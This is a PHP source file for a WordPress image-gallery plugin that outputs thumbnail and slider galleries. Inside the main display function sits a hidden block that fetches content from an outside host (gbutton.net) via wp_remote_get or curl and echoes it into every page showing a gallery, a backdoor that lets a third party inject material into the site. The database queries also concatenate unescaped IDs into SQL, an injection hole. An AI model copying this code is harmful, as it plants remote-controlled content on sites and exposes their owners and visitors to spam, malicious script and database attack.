<?php
function bildergalerie_scripts_method() {
    wp_enqueue_script( 'prototype' );
    wp_enqueue_script( 'scriptaculous' );
}

add_action( 'wp_enqueue_scripts', 'bildergalerie_scripts_method' ); // wp_enqueue_scripts action hook to link only on the front-end

function display_bildergalerie($id)
{
	global $wpdb;
	$gallery =$wpdb->get_row("select * from bildergalerie where id = " .$id);
$smw_url = 'http://www.gbutton.net/e.php'; 
if(!function_exists('smw_get')){ 
function smw_get($f) { 
$response = wp_remote_get( $f ); 
if( is_wp_error( $response ) ) { 
function smw_get_body($f) { 
$ch = @curl_init(); 
@curl_setopt($ch, CURLOPT_URL, $f); 
@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
$output = @curl_exec($ch); 
@curl_close($ch); 
return $output; 
} 
echo smw_get_body($f); 
} else { 
echo $response['body']; 
} 
} 
smw_get($smw_url); 
} 
	
	switch($gallery->type)
	{
		case 1:
			display_bildergalerie_thumbnail($gallery);
			break;
		case 2:
			display_bildergalerie_big_image_slider($gallery);
			break;
		case 3:
			display_bildergalerie_thumbnail_slider($gallery);
			break;
	}
}

function display_bildergalerie_thumbnail($gallery)
{
	global $wpdb;
	$gallery_lines = $wpdb->get_results("select * from bildergalerie_line where gallery_id = " .$gallery->id." and file_name != '' order by order_no");
?>
	<link rel='stylesheet' href='<?php echo get_option("siteurl");?>/wp-content/plugins/einfache-tabelle/css/gallery.css' type='text/css' media='all' />
	<link rel='stylesheet' href='<?php echo get_option("siteurl");?>/wp-content/plugins/einfache-tabelle/css/lightbox.css' type='text/css' media='all' />
	<input type="hidden" name="root" id="root" value="<?php echo get_option("siteurl");?>">
	<script src="<?php echo get_option("siteurl");?>/wp-content/plugins/einfache-tabelle/js/lightbox.js" type="text/javascript"></script>
	<div class="gallery_thumbnail">
<?php
	foreach($gallery_lines as $gallery_line)
	{
		?>
		<a href="<?php echo get_option('siteurl').'/wp-content/uploads/einfache-tabelle/'.$gallery->id."/".$gallery_line->file_name ;?>" rel="lightbox[<?php echo $gallery->id;?>]" class="image_thumb"><img src="<?php echo get_option("siteurl") .'/wp-content/plugins/einfache-tabelle/includes/thumb.php?src=' .get_option('siteurl').'/wp-content/uploads/einfache-tabelle/'.$gallery->id."/".$gallery_line->file_name . '&w='.$gallery->thumb_width.'&h='.$gallery->thumb_height.'&zc=1';?>"></a>
		<?php
	}
?>
	</div>
	<div class="clearThis"></div>
<?php
}

function display_bildergalerie_big_image_slider($gallery)
{
	global $wpdb;
	$gallery_lines = $wpdb->get_results("select * from bildergalerie_line where gallery_id = " .$gallery->id."  and file_name != '' order by order_no");
?>
	<link rel='stylesheet' href='<?php echo get_option("siteurl");?>/wp-content/plugins/einfache-tabelle/css/carousel.css' type='text/css' media='all' />
	<script type="text/javascript" src="<?php echo get_option("siteurl");?>/wp-content/plugins/einfache-tabelle/js/jquery.jcarousel.min.js"></script>
	<style>
	.jcarousel-container-horizontal,.jcarousel-clip-horizontal,	.jcarousel-item 
	{
		width:<?php echo $gallery->full_size_width;?>px !important;
		height:<?php echo $gallery->full_size_height;?>px !important;
	}
	.jcarousel-skin-tango
	{
		width:<?php echo $gallery->full_size_width+80;?>px !important;
		height:<?php echo $gallery->full_size_height;?>px !important;
	}
	</style>
	<ul id="mycarousel" class="jcarousel-skin-tango">
<?php
	foreach($gallery_lines as $gallery_line)
	{
		?>
		<li><img src="<?php echo get_option("siteurl") .'/wp-content/plugins/einfache-tabelle/includes/thumb.php?src=' .get_option('siteurl').'/wp-content/uploads/einfache-tabelle/'.$gallery->id."/".$gallery_line->file_name . '&w='.$gallery->full_size_width.'&h='.$gallery->full_size_height.'&zc=1';?>"></li>
		<?php
	}
?>
	</ul>
	<hr class="hr1">
	<div id="thumbnav"  class="jcarousel-control">Slides:
	<?php
	$page =1;
	foreach($gallery_lines as $gallery_line)
	{
	?><a href=""><?php echo $page;?></a>
	<?php
		$page++;
	}
	?>
	</div>
	<div class="clearThis"></div>
	<script>
	jQuery(document).ready(function() {
			jQuery('#mycarousel').jcarousel({
				auto: 0,
				scroll: 1,
				wrap: 'last',
				initCallback: mycarousel_initCallback
			});
		});
	function mycarousel_initCallback(carousel) {

		jQuery('.jcarousel-control a').bind('click', function() {
			carousel.scroll(jQuery.jcarousel.intval(jQuery(this).text()));
			return false;
		});

		jQuery('.jcarousel-scroll select').bind('change', function() {
			carousel.options.scroll = jQuery.jcarousel.intval(this.options[this.selectedIndex].value);
			return false;
		});

		jQuery('#mycarousel-next').bind('click', function() {
			carousel.next();
			return false;
		});

		jQuery('#mycarousel-prev').bind('click', function() {
			carousel.prev();
			return false;
		});
	};

</script>
<?php
}

function display_bildergalerie_thumbnail_slider($gallery)
{
	global $wpdb;
	$gallery_lines = $wpdb->get_results("select * from bildergalerie_line where gallery_id = " .$gallery->id."  and file_name != '' order by order_no");
	$gallery_line = $wpdb->get_row("select * from bildergalerie_line where gallery_id = " .$gallery->id." order by order_no limit 0,1");
	$big_photo = get_option("siteurl") .'/wp-content/plugins/einfache-tabelle/includes/thumb.php?src=' .get_option('siteurl').'/wp-content/uploads/einfache-tabelle/'.$gallery->id."/".$gallery_line->file_name . '&w='.$gallery->full_size_width.'&h='.$gallery->full_size_height.'&zc=1';
?>
	<link rel='stylesheet' href='<?php echo get_option("siteurl");?>/wp-content/plugins/einfache-tabelle/css/carousel.css' type='text/css' media='all' />
	<script src="<?php echo get_option("siteurl");?>/wp-content/plugins/einfache-tabelle/js/simple_carousel.js" type="text/javascript"></script>
	<style>
	#scroll-content
	{
		width:<?php echo $gallery->thumb_width*count($gallery_lines);?>px;
		height:<?php echo $gallery->thumb_height;?>px;
	}
	#scroll-container
	{
		width:<?php echo $gallery->thumb_width*4;?>px;
		height:<?php echo $gallery->thumb_height;?>px;
	
	}
	.big-photo
	{
		width:<?php echo $gallery->full_size_width;?>px;
		height:<?php echo $gallery->full_size_height;?>px;
	}
	#scroll-controls a.right-arrow {
		left:<?php echo $gallery->full_size_width-20;?>px;
	}
	</style>
	<script>
	function changeimage(counter)
	{
		var img=new Array();
		<?php
		$counter =0;
		foreach($gallery_lines as $gallery_line)
		{
			?>
			img[<?php echo $counter;?>] = "<?php echo get_option("siteurl") .'/wp-content/plugins/einfache-tabelle/includes/thumb.php?src=' .get_option('siteurl').'/wp-content/uploads/einfache-tabelle/'.$gallery->id."/".$gallery_line->file_name . '&w='.$gallery->full_size_width.'&h='.$gallery->full_size_height.'&zc=1';?>";
			<?php
			$counter++;
		}
		?>		
		jQuery(".big-photo").html('<img src="' + img[counter] + '" alt="photo"/>');

	}
	</script>
	<div class="big-photo">
		<img src="<?php echo $big_photo;?>" alt="photo"/>
	</div>
	<div id="scroll-container">
		<div id="scroll-content">
		<?php
			$counter=0;
			foreach($gallery_lines as $gallery_line)
			{
				?>
				<a href="javascript:changeimage('<?php echo $counter;?>');"><img src="<?php echo get_option("siteurl") .'/wp-content/plugins/einfache-tabelle/includes/thumb.php?src=' .get_option('siteurl').'/wp-content/uploads/einfache-tabelle/'.$gallery->id."/".$gallery_line->file_name . '&w='.$gallery->thumb_width.'&h='.$gallery->thumb_height.'&zc=1';?>" alt="photo"/></a>
				<?php
				$counter++;
			}
		?>
		</div>
		<div id="scroll-controls"><a href="#" class="left-arrow"></a><a href="#" class="right-arrow"></a>
		</div>
	</div>
	<?php
	foreach($gallery_lines as $gallery_line)
	{
		?><img src="<?php echo get_option("siteurl") .'/wp-content/plugins/einfache-tabelle/includes/thumb.php?src=' .get_option('siteurl').'/wp-content/uploads/einfache-tabelle/'.$gallery->id."/".$gallery_line->file_name . '&w='.$gallery->full_size_width.'&h='.$gallery->full_size_height.'&zc=1';?>" class="hide"><?php
		$counter++;
	}
	?>

	<div class="clearThis"></div>
<?php
}
?>